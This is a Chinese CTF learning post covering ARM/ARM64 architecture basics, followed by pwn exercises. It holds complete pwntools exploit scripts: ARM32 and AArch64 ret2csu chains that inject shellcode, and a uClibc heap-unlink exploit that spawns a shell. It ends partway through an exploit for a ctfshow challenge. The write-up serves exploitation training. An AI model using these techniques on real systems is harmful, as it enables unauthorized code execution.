<p>改变CPSR状态寄存器里的T标志位，使用BX或者LDR PC等指令，都可以完成。假设addr是一个对齐后的地址（即addr末尾为4或者0），则BX addr+1就可以切换到thumb模式，而BX addr，就可以切换到arm模式。都是带状态转移的指令。</p>
<blockquote>
<p>反汇编分析时，识别thumb指令与arm指令</p>
<p>当看到code 16声明时，说明对面的代码都是thumb指令，只有再次遇到code32位时，后面的代码才是arm指令。</p>
<p>code32是arm指令;code16是thumb指令</p>
<p>code32的指令与code16处的指令互相调用就需要利用BX或者更改PC来跳转，跳转时地址最后1bit用于状态表示</p>
</blockquote>
<h2 id="arm64"><a href="#arm64" class="headerlink" title="arm64"></a>arm64</h2><p>arm64里，64位寄存器用X表示，比如X0、X1、X2，32位寄存器用W表示，比如W0、W1、W2。在ARM64下，没有了thumb指令。</p>
<p>ARM64的传参为X0~X7传递前8给参数，剩余的用栈传递。</p>
<p>返回值仍是X0寄存器</p>
<p>程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h,<span class="type">int</span> i,<span class="type">int</span> j,<span class="type">int</span> k,<span class="type">int</span> l)</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>,a,b,c,d);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        fun(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>arm的反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400658 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658 ; Attributes: bp-based frame fpd=0x30</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658                 EXPORT fun</span><br><span class="line">.text:0000000000400658 fun                                     ; CODE XREF: main+4C↓p</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658 var_30          = -0x30</span><br><span class="line">.text:0000000000400658 var_20          = -0x20</span><br><span class="line">.text:0000000000400658 var_1C          = -0x1C</span><br><span class="line">.text:0000000000400658 var_18          = -0x18</span><br><span class="line">.text:0000000000400658 var_14          = -0x14</span><br><span class="line">.text:0000000000400658 var_10          = -0x10</span><br><span class="line">.text:0000000000400658 var_C           = -0xC</span><br><span class="line">.text:0000000000400658 var_8           = -8</span><br><span class="line">.text:0000000000400658 var_4           = -4</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658                 STP             X29, X30, [SP,#var_30]! </span><br><span class="line">; 保存FP(X29)和LR(X30)到栈顶，同时SP -= 0x30</span><br><span class="line">.text:000000000040065C                 MOV             X29, SP; 设置新栈帧基址(X29 = SP)</span><br><span class="line">; 将寄存器参数存入栈帧（ARM64规则：前8个参数用W0-W7传递）</span><br><span class="line">.text:0000000000400660                 STR             W0, [X29,#0x30+var_4] ; 保存参数到栈 [X29-4]</span><br><span class="line">.text:0000000000400664                 STR             W1, [X29,#0x30+var_8]</span><br><span class="line">.text:0000000000400668                 STR             W2, [X29,#0x30+var_C]</span><br><span class="line">.text:000000000040066C                 STR             W3, [X29,#0x30+var_10]</span><br><span class="line">.text:0000000000400670                 STR             W4, [X29,#0x30+var_14]</span><br><span class="line">.text:0000000000400674                 STR             W5, [X29,#0x30+var_18]</span><br><span class="line">.text:0000000000400678                 STR             W6, [X29,#0x30+var_1C]</span><br><span class="line">.text:000000000040067C                 STR             W7, [X29,#0x30+var_20]</span><br><span class="line">.text:0000000000400680                 ADRL            X0, aDDDD ; &quot;%d %d %d %d\n&quot;</span><br><span class="line">; 加载格式字符串地址 &quot;%d %d %d %d\n&quot; 到 X0（参数1）</span><br><span class="line">.text:0000000000400688                 LDR             W4, [X29,#0x30+var_10]; 从栈加载第4个参数到 W4（参数5）</span><br><span class="line">.text:000000000040068C                 LDR             W3, [X29,#0x30+var_C]</span><br><span class="line">.text:0000000000400690                 LDR             W2, [X29,#0x30+var_8]</span><br><span class="line">.text:0000000000400694                 LDR             W1, [X29,#0x30+var_4]</span><br><span class="line">.text:0000000000400698                 BL              printf ; 调用 printf(X0, X1, X2, X3, W4)</span><br><span class="line">; === 函数退出 ===</span><br><span class="line">.text:000000000040069C                 MOV  W0, #1          ; 设置返回值 W0 = 1</span><br><span class="line">.text:00000000004006A0                 LDP  X29, X30, [SP+0x30+var_30],#0x30  ; 恢复FP/LR，同时 SP += 0x30</span><br><span class="line">.text:00000000004006A4                 RET                  ; 返回调用处（跳转到 LR 保存的地址）</span><br><span class="line">.text:00000000004006A4 ; End of function fun</span><br><span class="line">.text:00000000004006A4</span><br></pre></td></tr></table></figure>

<p>ARM64里ADRP寻址，使用ADRP将目标的页地址存入寄存器，然后使用add加上offest，从而获得目标地址</p>
<p>ARM64新增了ret指令，但是ret并不会从栈里弹出一个数据到pc中。ret指令会将Ir寄存器（X30）的值赋给pc。</p>
<p>因此，一般函数结尾可以看到这两句，其中X29类似于x86下的rbp。X30是LR寄存器，ret就是将x30的值赋给pc，从而实现返回</p>
<p><img data-src="/../images/image-20250714210630341.png" alt="image-20250714210630341"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>在x86下的各种思想，同样使用于arm。</p>
<p>通过csu控制多个寄存器，并调用对应的函数</p>
<p>arm下的堆的性质取决于libc，如果是glibc那么以前的手法都是用，如果是其它libc，也可以自行调试，发现性质。</p>
<table>
<thead>
<tr>
<th>架构</th>
<th>等价于 ebp&#x2F;rbp 的寄存器</th>
<th>官方名称&#x2F;常用别名</th>
</tr>
</thead>
<tbody><tr>
<td><strong>arm32 (A32&#x2F;T32)</strong></td>
<td>R11</td>
<td>fp (Frame Pointer)</td>
</tr>
<tr>
<td><strong>aarch64 (A64)</strong></td>
<td>X29</td>
<td>fp (Frame Pointer)</td>
</tr>
</tbody></table>
<h2 id="例题学习"><a href="#例题学习" class="headerlink" title="例题学习"></a>例题学习</h2><h3 id="root-me-stack-buffer-overflow-basic"><a href="#root-me-stack-buffer-overflow-basic" class="headerlink" title="root_me_stack_buffer_overflow_basic"></a>root_me_stack_buffer_overflow_basic</h3><p>自己整的题，保护：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Arch:       arm-32-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled on new kernels</span><br><span class="line">PIE:        No PIE (0x10000)</span><br><span class="line">Stack:      Executable</span><br><span class="line">RWX:        Has RWX segments</span><br><span class="line">FORTIFY:    Enabled</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>

<p>可以注入shellcode到bss段，在跳转过去执行</p>
<p>反汇编如下，很明显的可以看到scanf没有进行输入限制，存在溢出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s_1; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// t1</span></span><br><span class="line">  <span class="type">int</span> n15; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> n121; <span class="comment">// [sp+7h] [bp-A9h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">168</span>]; <span class="comment">// [sp+8h] [bp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  n121 = <span class="number">121</span>;<span class="comment">//&#x27;y&#x27;</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    _printf_chk(<span class="number">1</span>, <span class="string">&quot;Give me data to dump:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot; %[^\n]s&quot;</span>, s) )  <span class="comment">//scanf()溢出</span></span><br><span class="line">    &#123;</span><br><span class="line">      s_1 = s;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strlen</span>(s) &gt; v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          n15 = v4++ &amp; <span class="number">0xF</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !n15 )</span><br><span class="line">            _printf_chk(<span class="number">1</span>, <span class="string">&quot;%p: &quot;</span>, s_1);</span><br><span class="line">          v5 = (<span class="type">unsigned</span> __int8)*s_1++;</span><br><span class="line">          _printf_chk(<span class="number">1</span>, <span class="string">&quot; %02x&quot;</span>, v5);</span><br><span class="line">          <span class="keyword">if</span> ( n15 != <span class="number">15</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          _printf_chk(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &lt;= v4 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_9:</span><br><span class="line">    _printf_chk(<span class="number">1</span>, <span class="string">&quot;\nDump again (y/n):\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;n121) &amp;&amp; (n121 &amp; <span class="number">0xDF</span>) == <span class="number">0x59</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题的思路是我们通过csu来控制流程，执行函数，如图：</p>
<img data-src="../images/image-20250715164602158.png" alt="image-20250715164602158" style="zoom:67%;" />

<table>
<thead>
<tr>
<th>特性</th>
<th>call (Intel x86)</th>
<th>BL (ARM 32-bit)</th>
<th>BLX (ARM 32-bit)</th>
</tr>
</thead>
<tbody><tr>
<td><strong>主要功能</strong></td>
<td>子程序调用</td>
<td>子程序调用</td>
<td>子程序调用并切换状态</td>
</tr>
<tr>
<td><strong>返回地址存储</strong></td>
<td>压入<strong>栈</strong></td>
<td>存入<strong>链接寄存器 (LR)</strong></td>
<td>存入<strong>链接寄存器 (LR)</strong></td>
</tr>
<tr>
<td><strong>指令集切换</strong></td>
<td>不适用</td>
<td><strong>否</strong> (保持当前状态)</td>
<td><strong>是</strong> (根据目标地址的最低位决定)</td>
</tr>
<tr>
<td><strong>典型用途</strong></td>
<td>所有函数调用</td>
<td>调用同一指令集的函数</td>
<td>在 ARM 和 Thumb 代码间互相调用</td>
</tr>
</tbody></table>
<p>但是呢在csu处的前面我们可以发现它是CODE16说明csu处的指令是thumb模式，如下图可说明：</p>
<img data-src="../images/image-20250715164716861.png" alt="image-20250715164716861" style="zoom:67%;" />

<p>因为csu处是thumb指令所有我们肯定不能直接控制pc到0x10610处调用，而是0x10611后面的那个1并不是地址里面的而是一个标志位（改变CPSR状态寄存器里的T标志位），就是前面那张图片中State bit(工作状态)设置为1</p>
<p>总体思路：</p>
<p>最终exp，就是一个ret2csu</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./root_me_stack_buffer_overflow_basic_20210901_115841&#x27;</span>)</span><br><span class="line">scanf_got = elf.got[<span class="string">&#x27;scanf&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x00021008</span> + <span class="number">0x100</span></span><br><span class="line">csu_pop = <span class="number">0x00010610</span></span><br><span class="line">csu_call = <span class="number">0x000105FE</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf&#x27;</span>,<span class="string">&#x27;./root_me_stack_buffer_overflow_basic_20210901_115841&#x27;</span>])</span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;./root_me_stack_buffer_overflow_basic_20210901_115841&#x27;])</span></span><br><span class="line"><span class="comment"># 目标：调用 scanf(format, bss_addr)，其中 format 是我们输入的 shellcode</span></span><br><span class="line"><span class="comment"># scanf 的原型是 scanf(const char *format, ...);</span></span><br><span class="line"><span class="comment"># R0 = format_string_address</span></span><br><span class="line"><span class="comment"># R1 = address_to_write_to</span></span><br><span class="line"><span class="comment"># ... 其他参数================&gt;&gt;&gt; R3(R0,R1...)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们需要控制的寄存器：</span></span><br><span class="line"><span class="comment"># R0 -&gt; &quot;我们发送的shellcode&quot; (这比较难直接控制，但 scanf 可以从标准输入读取)</span></span><br><span class="line"><span class="comment"># R1 -&gt; bss (一个可写的内存地址，用来存放 shellcode)</span></span><br><span class="line"><span class="comment"># R7 -&gt; R0 -&gt; 调用 scanf 时，R7 需要是 scanf 的第一个参数。这里利用 R7 来控制 R0。</span></span><br><span class="line"><span class="comment">#       但是 scanf 的第一个参数是格式化字符串，我们希望它能接收任意字符，</span></span><br><span class="line"><span class="comment">#       可以找一个指向类似 &quot;%s&quot; 或能接收输入的地址，或者更巧妙地，利用 scanf 自身特性。</span></span><br><span class="line"><span class="comment">#       这里 exp 的作者选择了一个更简单直接的方式：利用 scanf 的返回值，</span></span><br><span class="line"><span class="comment">#       并构造一个 ROP 链来调用它。</span></span><br><span class="line"><span class="comment">#       不过这里的payload的目的是调用 scanf(0x00010644, bss)。</span></span><br><span class="line"><span class="comment">#       查看 0x00010644 的内容可能是一个格式化字符串。</span></span><br><span class="line"><span class="comment"># R8 -&gt; R1 -&gt; bss (用来存放 shellcode 的地址)</span></span><br><span class="line"><span class="comment"># R9 -&gt; R2 -&gt; 这里用不到第三个参数，设为 0</span></span><br><span class="line"><span class="comment"># R5 -&gt; scanf_got (scanf 函数在 GOT 表中的地址，LDR.W R3, [R5] 会把 scanf 的真实地址加载到 R3)</span></span><br><span class="line"><span class="comment"># R6 -&gt; 1 (用于跳出循环)</span></span><br><span class="line"><span class="comment"># R4 -&gt; 0 (初始值，在 csu_call 中加 1 后会等于 R6，从而跳出循环)</span></span><br><span class="line"><span class="comment"># R3 -&gt; 我们要调用的函数</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xA4</span> + p32(csu_pop + <span class="number">1</span>) <span class="comment">#切换到Thumb模式，bit0 = 1</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#R3</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#R4</span></span><br><span class="line">payload += p32(scanf_got) <span class="comment">#R5</span></span><br><span class="line">payload += p32(<span class="number">1</span>) <span class="comment">#R6</span></span><br><span class="line">payload += p32(<span class="number">0x00010644</span>) <span class="comment">#R7</span></span><br><span class="line">payload += p32(bss) <span class="comment">#R8</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#R9</span></span><br><span class="line">payload += p32(csu_call + <span class="number">1</span>) <span class="comment">#Thumb模式，bit0 = 1</span></span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">0x7</span></span><br><span class="line">payload += p32(bss) <span class="comment">#执行shellcode</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;dump:&#x27;</span>,payload)</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Dump again (y/n):&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="task"><a href="#task" class="headerlink" title="task"></a>task</h3><p>64位arm的ret2csu</p>
<p>程序源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">0x60</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;what do you want to say:&quot;</span>);</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;welcome to haivk&#x27;s class&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;what is your name:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,name,<span class="number">0x60</span>);</span><br><span class="line">        fun();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路（根据前面arm64知识中的栈结构可知，我们溢出只能修改调用函数的返回地址）：</p>
<ol>
<li>第一次输入放入shellcode和mprotect()的地址</li>
<li>第二次输入栈溢出，布局寄存器的值</li>
<li>getshell</li>
</ol>
<p><img data-src="/../images/image-20250716181619125.png" alt="image-20250716181619125"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-aarch64&#x27;,&#x27;./task&#x27;])</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;./task&#x27;</span>])</span><br><span class="line">bss = <span class="number">0x0000000000490440</span></span><br><span class="line">read_addr = <span class="number">0x0000000000416930</span></span><br><span class="line">mprotect_addr = <span class="number">0x0000000000417370</span></span><br><span class="line">csu_ld = <span class="number">0x0000000000400DC4</span></span><br><span class="line">csu_call = <span class="number">0x0000000000400DA4</span></span><br><span class="line"></span><br><span class="line">payload =  p64(mprotect_addr) + asm(shellcraft.sh())</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;name:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(csu_ld)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(csu_call) <span class="comment">#x29 x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(bss) <span class="comment">#x19 x20</span></span><br><span class="line">payload += p64(<span class="number">0x60</span>) + p64(<span class="number">0x7</span>) <span class="comment">#x21 x22</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(bss) <span class="comment">#x23 x24</span></span><br><span class="line"><span class="comment">#x24(x20,x21,x22) == mprotect(bss, 0x60, 7) == x3(w0,x1,x2)</span></span><br><span class="line"><span class="comment">#x29 x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(bss + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;say:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h3><p>arm的堆题</p>
<p>核心就是看装载的libc的是哪种，若是glibc那就正常打，还有其它的libc如uClibc它和glibc内存分配规则一样，还有其他的就根据libc的chunk分配规则来做题</p>
<p>下面是一道arm 堆题的exp，漏洞是堆溢出，手法：unlink，总统看上去和glibc的脚本一样</p>
<p>所以arm的堆题就是换汤不换药，arm架构主要还是栈的问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;./pwnme&#x27;])</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;./pwnme&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libuClibc-1.0.34.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Length:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">b&#x27;Tag:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Length:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">b&#x27;Tag:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Tag:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">heap_ptr0_addr = <span class="number">0x0002106C</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x81</span>)</span><br><span class="line">payload += p32(heap_ptr0_addr-<span class="number">0xC</span>) + p32(heap_ptr0_addr-<span class="number">0x8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x80</span>) + p32(<span class="number">0x88</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,payload)</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>) + p32(<span class="number">0x8</span>) + p32(puts_got) + p32(<span class="number">0x8</span>) + p32(free_got) + p32(<span class="number">0x8</span>) + p32(<span class="number">0x00021068</span>))</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;0 : &#x27;</span>)</span><br><span class="line">uclibc_base = u32(sh.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = uclibc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = uclibc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;uclibc_base=&#x27;</span>,<span class="built_in">hex</span>(uclibc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x4</span>,p32(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="pwn346"><a href="#pwn346" class="headerlink" title="pwn346"></a>pwn346</h3><p>arm32栈溢出，有后门函数</p>
<p>漏洞函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r3</span></span><br><span class="line">  _BYTE buf[<span class="number">24</span>]; <span class="comment">// [sp+4h] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your input: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64u</span>);<span class="comment">//溢出</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里发现一些小技巧</p>
<p><strong>关于arm文件调试：</strong></p>
<ul>
<li>直接用exp.py脚本调试，就是用pwntools的库配合gdb来调试，这样的话就会显示出bl #read@plt 这样的看着比较清晰、舒服，而且直接gdb运程监听会进入到这个函数内部（个人感觉比较无用）</li>
<li>arm也可以用<code>cyclic -l 字符</code>这样的方式来测试溢出长度，但还是要以实际调试的为准</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-07-17 11:01:27</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28163</span>)</span><br><span class="line"><span 